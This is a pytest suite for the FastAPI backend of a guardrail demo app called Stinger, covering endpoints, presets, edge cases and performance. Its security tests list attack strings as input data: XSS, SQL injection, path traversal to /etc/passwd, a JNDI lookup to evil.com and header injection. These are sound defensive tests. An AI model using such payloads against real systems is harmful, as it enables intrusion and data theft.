#!/usr/bin/env python3
"""
Comprehensive tests for Stinger Web Demo backend.

This file provides thorough validation tests for the FastAPI backend
including edge cases, error handling, and security validation.
"""

import sys
import os
import pytest
import tempfile
import json
import time
import gc
from pathlib import Path
from fastapi.testclient import TestClient
import yaml
from unittest.mock import patch, MagicMock

# Add src to path for Stinger imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "src"))

# Import the FastAPI app
from main import app

# Create test client
client = TestClient(app)

@pytest.fixture(autouse=True)
def setup_pipeline():
    """Initialize pipeline for tests since lifespan events don't run in TestClient."""
    import main
    from stinger.core.pipeline import GuardrailPipeline
    import tempfile
    import yaml
    from pathlib import Path
    
    # Initialize pipeline if not already done
    if not hasattr(main.app.state, 'current_pipeline') or main.app.state.current_pipeline is None:
        try:
            main.app.state.current_pipeline = GuardrailPipeline.from_preset("customer_service")
            print(f"[TEST FIXTURE] ✅ Pipeline initialized for tests")
        except Exception as e:
            print(f"[TEST FIXTURE] ❌ Failed to initialize pipeline: {e}")
            # Create a basic fallback pipeline using temp config file
            try:
                from stinger.core.preset_configs import PresetConfigs
                config = PresetConfigs.basic_pipeline()
                
                with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                    yaml.dump(config, f)
                    temp_config_path = f.name
                
                main.app.state.current_pipeline = GuardrailPipeline(temp_config_path)
                
                # Clean up temp file
                Path(temp_config_path).unlink()
                print(f"[TEST FIXTURE] ✅ Fallback pipeline created")
            except Exception as fallback_error:
                print(f"[TEST FIXTURE] ❌ Failed to create fallback pipeline: {fallback_error}")
                # Last resort: create minimal pipeline
                try:
                    main.app.state.current_pipeline = GuardrailPipeline()
                    print(f"[TEST FIXTURE] ✅ Minimal pipeline created")
                except Exception as minimal_error:
                    print(f"[TEST FIXTURE] ❌ Failed to create minimal pipeline: {minimal_error}")
                    main.app.state.current_pipeline = None
    
    # Initialize conversation if not already done
    if not hasattr(main.app.state, 'current_conversation') or main.app.state.current_conversation is None:
        try:
            main.app.state.current_conversation = main.Conversation.human_ai("test_user", "gpt-4o-mini")
            print(f"[TEST FIXTURE] ✅ Conversation initialized for tests")
        except Exception as e:
            print(f"[TEST FIXTURE] ❌ Failed to initialize conversation: {e}")
    
    # Initialize guardrail settings if not already done
    if not hasattr(main.app.state, 'current_guardrail_settings') or main.app.state.current_guardrail_settings is None:
        try:
            if main.app.state.current_pipeline:
                status = main.app.state.current_pipeline.get_guardrail_status()
                main.app.state.current_guardrail_settings = main.GuardrailSettings(
                    input_guardrails=[
                        main.GuardrailConfig(name=info["name"], enabled=info["enabled"])
                        for info in status.get("input_guardrails", [])
                    ],
                    output_guardrails=[
                        main.GuardrailConfig(name=info["name"], enabled=info["enabled"])
                        for info in status.get("output_guardrails", [])
                    ],
                    preset="customer_service",
                    use_conversation_aware_prompt_injection=False
                )
                print(f"[TEST FIXTURE] ✅ Guardrail settings initialized for tests")
        except Exception as e:
            print(f"[TEST FIXTURE] ❌ Failed to initialize guardrail settings: {e}")


def test_health_endpoint():
    """Test the health check endpoint."""
    response = client.get("/api/health")
    assert response.status_code == 200
    
    data = response.json()
    assert "status" in data
    assert "pipeline_loaded" in data
    assert "audit_enabled" in data


def test_guardrails_endpoint():
    """Test getting guardrail settings."""
    response = client.get("/api/guardrails")
    assert response.status_code == 200
    
    data = response.json()
    assert "input_guardrails" in data
    assert "output_guardrails" in data
    assert "preset" in data


def test_presets_endpoint():
    """Test getting available presets."""
    response = client.get("/api/presets")
    assert response.status_code == 200
    
    data = response.json()
    assert "presets" in data
    assert isinstance(data["presets"], dict)


def test_conversation_endpoint():
    """Test conversation info endpoint."""
    response = client.get("/api/conversation")
    assert response.status_code == 200
    
    data = response.json()
    assert "active" in data
    assert "conversation_id" in data


def test_audit_log_endpoint():
    """Test audit log endpoint."""
    response = client.get("/api/audit_log")
    assert response.status_code == 200
    
    data = response.json()
    assert "status" in data
    assert "recent_records" in data


def test_chat_endpoint():
    """Test the main chat endpoint."""
    message = {
        "content": "Hello, this is a test message"
    }
    
    response = client.post("/api/chat", json=message)
    assert response.status_code == 200
    
    data = response.json()
    assert "content" in data
    assert "blocked" in data
    assert "warnings" in data
    assert "reasons" in data
    assert "conversation_id" in data
    assert "processing_details" in data


def test_chat_with_pii():
    """Test chat with PII content."""
    message = {
        "content": "My social security number is 123-45-6789"
    }
    
    response = client.post("/api/chat", json=message)
    assert response.status_code == 200
    
    data = response.json()
    # This might be blocked depending on guardrail configuration
    assert isinstance(data["blocked"], bool)
    assert isinstance(data["warnings"], list)
    assert isinstance(data["reasons"], list)


def test_guardrail_settings_update():
    """Test updating guardrail settings with input/output separation."""
    # First get current settings
    response = client.get("/api/guardrails")
    assert response.status_code == 200
    current_settings = response.json()
    
    # Test input guardrail toggle
    if current_settings["input_guardrails"]:
        updated_settings = current_settings.copy()
        first_input_guardrail = updated_settings["input_guardrails"][0]
        original_state = first_input_guardrail["enabled"]
        first_input_guardrail["enabled"] = not original_state
        
        response = client.post("/api/guardrails", json=updated_settings)
        assert response.status_code == 200
        
        data = response.json()
        assert data["status"] == "success"
        
        # Verify the change took effect
        response = client.get("/api/guardrails")
        assert response.status_code == 200
        updated_data = response.json()
        assert updated_data["input_guardrails"][0]["enabled"] == (not original_state)
    
    # Test output guardrail toggle separately
    if current_settings["output_guardrails"]:
        updated_settings = current_settings.copy()
        first_output_guardrail = updated_settings["output_guardrails"][0]
        original_state = first_output_guardrail["enabled"]
        first_output_guardrail["enabled"] = not original_state
        
        response = client.post("/api/guardrails", json=updated_settings)
        assert response.status_code == 200
        
        data = response.json()
        assert data["status"] == "success"


def test_conversation_reset():
    """Test conversation reset."""
    response = client.post("/api/conversation/reset")
    assert response.status_code == 200
    
    data = response.json()
    assert data["status"] == "success"


def test_preset_loading():
    """Test loading different presets."""
    presets_response = client.get("/api/presets")
    presets = presets_response.json()["presets"]
    
    if presets:
        # Try loading the first available preset
        first_preset = list(presets.keys())[0]
        response = client.post("/api/preset", json={"preset": first_preset})
        assert response.status_code == 200
        
        data = response.json()
        assert data["status"] == "success"


def test_invalid_chat_message():
    """Test invalid chat message."""
    # Empty message
    response = client.post("/api/chat", json={"content": ""})
    assert response.status_code == 200  # Should handle gracefully
    
    # Missing content
    response = client.post("/api/chat", json={})
    assert response.status_code == 422  # Validation error


def test_invalid_preset():
    """Test loading invalid preset."""
    response = client.post("/api/preset", json={"preset": "nonexistent_preset"})
    assert response.status_code == 500  # Should return error


# ==== EDGE CASE AND ERROR HANDLING TESTS ====

def test_chat_with_very_long_message():
    """Test chat with extremely long message."""
    long_message = "A" * 10000
    message = {"content": long_message}
    
    response = client.post("/api/chat", json=message)
    assert response.status_code == 200
    
    data = response.json()
    # Should handle gracefully, possibly with length warnings
    assert "content" in data
    assert "blocked" in data


def test_chat_with_special_characters():
    """Test chat with special characters and unicode."""
    special_messages = [
        {"content": "Hello 🌟 world! Special chars: áéíóú çñü"},
        {"content": "Math symbols: ∑∆π∫∞≠≤≥"},
        {"content": "Code: <script>alert('xss')</script>"},
        {"content": "SQL injection: '; DROP TABLE users; --"},
        {"content": "Newlines\nand\ttabs\rand\rcarriage\rreturns"}
    ]
    
    for message in special_messages:
        response = client.post("/api/chat", json=message)
        assert response.status_code == 200
        
        data = response.json()
        assert "content" in data
        assert "blocked" in data
        assert isinstance(data["warnings"], list)


def test_chat_concurrent_requests():
    """Test multiple chat requests in sequence (simulating concurrency)."""
    # Send multiple requests in sequence to simulate concurrent behavior
    results = []
    for i in range(3):  # Reduced number for stability
        response = client.post("/api/chat", json={"content": f"Sequential test message {i}"})
        results.append(response)
        time.sleep(0.1)  # Small delay between requests
    
    # All should succeed
    for response in results:
        assert response.status_code == 200
        data = response.json()
        assert "content" in data
        assert "conversation_id" in data


def test_chat_with_malicious_payloads():
    """Test chat with various malicious payloads."""
    malicious_payloads = [
        "My social security number is 123-45-6789",
        "Credit card: 4532 1234 5678 9012",
        "Call me at 555-123-4567",
        "Email me at test@example.com",
        "My password is secretpassword123",
        "API key: sk-1234567890abcdefghijklmnopqrstuvwxyz"
    ]
    
    for payload in malicious_payloads:
        response = client.post("/api/chat", json={"content": payload})
        assert response.status_code == 200
        
        data = response.json()
        # Should have some protection (warnings or blocking)
        assert "warnings" in data or data.get("blocked", False)


def test_guardrail_settings_validation():
    """Test guardrail settings with invalid data."""
    invalid_settings = [
        {"invalid_field": "test"},
        {"input_guardrails": "not_a_list"},
        {"output_guardrails": [{"name": "test", "enabled": "not_boolean"}]},
        {"preset": 123},  # Should be string
        {"use_conversation_aware_prompt_injection": "not_boolean"}
    ]
    
    for settings in invalid_settings:
        response = client.post("/api/guardrails", json=settings)
        # Should either return validation error or handle gracefully
        assert response.status_code in [200, 422, 400]


def test_api_rate_limiting():
    """Test rapid API requests to check for rate limiting or stability."""
    responses = []
    start_time = time.time()
    
    # Send 20 rapid requests
    for i in range(20):
        response = client.get("/api/health")
        responses.append(response)
    
    end_time = time.time()
    
    # All should succeed (no rate limiting implemented)
    for response in responses:
        assert response.status_code == 200
    
    # Should complete reasonably quickly
    assert end_time - start_time < 10  # Should take less than 10 seconds


def test_cors_headers():
    """Test CORS headers are properly set."""
    response = client.options("/api/health")
    assert response.status_code in [200, 405]  # OPTIONS might not be implemented
    
    # Test with GET request
    response = client.get("/api/health")
    assert response.status_code == 200
    
    # Check for CORS headers (they might be added by FastAPI middleware)
    headers = response.headers
    # Note: TestClient might not include all CORS headers


def test_error_response_format():
    """Test that error responses have consistent format."""
    # Test non-existent endpoint
    response = client.get("/api/nonexistent")
    assert response.status_code == 404
    
    # Test invalid method
    response = client.delete("/api/health")  # DELETE not allowed
    assert response.status_code == 405


def test_audit_log_filtering():
    """Test audit log filtering and pagination."""
    # Generate some audit entries by making chat requests
    for i in range(3):  # Reduced for stability
        response = client.post("/api/chat", json={"content": f"Test message {i}"})
        # Don't assert on individual responses as they may have warnings
    
    # Test basic audit log retrieval
    response = client.get("/api/audit_log")
    assert response.status_code == 200
    
    data = response.json()
    assert "recent_records" in data
    # Don't assert on length as audit system may be empty initially
    
    # Test with query parameters (if supported)
    response = client.get("/api/audit_log?limit=2")
    # Accept any valid response code
    assert response.status_code in [200, 400, 422]


def test_conversation_state_persistence():
    """Test that conversation state persists across requests and is thread-safe."""
    # Start a conversation
    response1 = client.post("/api/chat", json={"content": "Hello, my name is Alice"})
    assert response1.status_code == 200
    
    data1 = response1.json()
    conversation_id = data1["conversation_id"]
    
    # Continue conversation
    response2 = client.post("/api/chat", json={"content": "What's my name?"})
    assert response2.status_code == 200
    
    data2 = response2.json()
    # Should maintain same conversation ID
    assert data2["conversation_id"] == conversation_id
    
    # Test rapid conversation turns to check thread safety
    for i in range(3):
        response = client.post("/api/chat", json={"content": f"Turn {i}"})
        assert response.status_code == 200
        data = response.json()
        assert data["conversation_id"] == conversation_id


def test_preset_switching_comprehensive():
    """Test comprehensive preset switching functionality."""
    # Get available presets
    response = client.get("/api/presets")
    assert response.status_code == 200
    
    presets = response.json()["presets"]
    assert len(presets) > 0
    
    original_settings = client.get("/api/guardrails")
    assert original_settings.status_code == 200
    
    # Try switching to each available preset
    for preset_name in presets.keys():
        response = client.post("/api/preset", json={"preset": preset_name})
        assert response.status_code == 200
        
        # Verify settings changed
        new_settings = client.get("/api/guardrails")
        assert new_settings.status_code == 200
        
        # Preset should be updated
        assert new_settings.json()["preset"] == preset_name


def test_memory_usage_stability():
    """Test system stability under load."""
    import gc
    
    # Perform moderate chat operations to test stability
    for i in range(10):  # Reduced number for test environment
        response = client.post("/api/chat", json={"content": f"Memory test {i}"})
        assert response.status_code == 200
        
        if i % 5 == 0:
            gc.collect()  # Force garbage collection
    
    # Just verify that the system is still responsive
    response = client.get("/api/health")
    assert response.status_code == 200
    
    # Test successful if no memory errors occurred
    assert True


# ==== SECURITY TESTS ====

def test_input_sanitization():
    """Test that inputs are properly sanitized."""
    dangerous_inputs = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",  # Template injection
        "<img src=x onerror=alert('xss')>"
    ]
    
    for dangerous_input in dangerous_inputs:
        response = client.post("/api/chat", json={"content": dangerous_input})
        assert response.status_code == 200
        
        data = response.json()
        # Response should not contain the dangerous input as-is
        response_content = data.get("content", "")
        # Should be either blocked or sanitized
        assert data.get("blocked", False) or dangerous_input not in response_content


def test_header_injection():
    """Test protection against header injection."""
    malicious_headers = {
        "X-Custom-Header": "test\r\nX-Injected: malicious",
        "User-Agent": "Mozilla/5.0\r\nX-Injected: malicious"
    }
    
    response = client.get("/api/health", headers=malicious_headers)
    # Should handle gracefully
    assert response.status_code == 200


# ==== PERFORMANCE TESTS ====

def test_response_times():
    """Test API response times are reasonable."""
    endpoints_to_test = [
        "/api/health",
        "/api/guardrails",
        "/api/presets",
        "/api/conversation",
        "/api/audit_log"
    ]
    
    for endpoint in endpoints_to_test:
        start_time = time.time()
        response = client.get(endpoint)
        end_time = time.time()
        
        assert response.status_code == 200
        response_time = end_time - start_time
        
        # Response should be under 5 seconds
        assert response_time < 5.0, f"{endpoint} took {response_time}s"


def test_chat_response_time():
    """Test chat endpoint response time."""
    start_time = time.time()
    response = client.post("/api/chat", json={"content": "Quick response test"})
    end_time = time.time()
    
    assert response.status_code == 200
    response_time = end_time - start_time
    
    # Chat should respond within 30 seconds (includes LLM call)
    assert response_time < 30.0, f"Chat took {response_time}s"


if __name__ == "__main__":
    print("🧪 Running Comprehensive Stinger Web Demo Backend Tests")
    print("=" * 60)
    
    # Run basic connectivity test
    try:
        response = client.get("/api/health")
        if response.status_code == 200:
            print("✅ Backend is responding")
            data = response.json()
            print(f"   Pipeline loaded: {data.get('pipeline_loaded')}")
            print(f"   Audit enabled: {data.get('audit_enabled')}")
            print(f"   Guardrails: {data.get('enabled_guardrails')}/{data.get('total_guardrails')}")
        else:
            print(f"❌ Backend health check failed: {response.status_code}")
    except Exception as e:
        print(f"❌ Could not connect to backend: {e}")
        sys.exit(1)
    
    print()
    print("Running comprehensive test suite...")
    print("This includes: API tests, edge cases, security tests, and performance tests")
    print()
    
    # Run all tests with verbose output
    exit_code = pytest.main([__file__, "-v", "--tb=short"])
    
    if exit_code == 0:
        print("\n🎉 All backend tests passed!")
    else:
        print("\n❌ Some backend tests failed!")
        sys.exit(exit_code)